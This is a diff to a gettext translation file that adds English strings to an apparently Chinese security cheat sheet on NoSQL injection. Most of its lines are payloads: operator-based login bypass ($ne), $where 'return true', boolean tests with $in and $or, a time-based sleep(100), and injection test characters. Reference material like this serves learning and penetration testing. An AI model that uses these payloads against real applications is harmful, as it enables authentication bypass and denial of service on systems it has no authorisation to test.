@@ -20,59 +20,59 @@ msgstr ""
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:2
 msgid "NoSQL Payload"
-msgstr ""
+msgstr "NoSQL Payload"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:5
 msgid "常见Payload"
-msgstr ""
+msgstr "Common Payloads"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:6
 msgid "绕过限制条件"
-msgstr ""
+msgstr "Bypass Restrictions"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:7
 #, python-brace-format
 msgid "``{\"username\": \"user\"}`` => ``{\"username\": {\"ne\": \"fakeuser\"}}``"
-msgstr ""
+msgstr "``{\"username\": \"user\"}`` => ``{\"username\": {\"ne\": \"fakeuser\"}}``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:8
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:14
 #, python-brace-format
 msgid "``{\"$where\":  \"return true\"}``"
-msgstr ""
+msgstr "``{\"$where\":  \"return true\"}``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:9
 msgid "测试用字符"
-msgstr ""
+msgstr "Test Characters"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:10
 msgid "``'\"\\/$[].>``"
-msgstr ""
+msgstr "``'\"\\/$[].>``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:11
 msgid "布尔测试常用"
-msgstr ""
+msgstr "Common Boolean Tests"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:12
 #, python-brace-format
 msgid "``{\"$ne\": -1}``"
-msgstr ""
+msgstr "``{\"$ne\": -1}``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:13
 #, python-brace-format
 msgid "``{\"$in\": []}``"
-msgstr ""
+msgstr "``{\"$in\": []}``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:15
 #, python-brace-format
 msgid "``{\"$or\": [{},{\"foo\":\"1\"}]}``"
-msgstr ""
+msgstr "``{\"$or\": [{},{\"foo\":\"1\"}]}``"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:16
 msgid "时间"
-msgstr ""
+msgstr "Time"
 
 #: ../../source/vuln/sql/cheatsheet/nosql.rst:17
 #, python-brace-format
 msgid "``{\"$where\":  \"sleep(100)\"}``"
-msgstr ""
+msgstr "``{\"$where\":  \"sleep(100)\"}``"
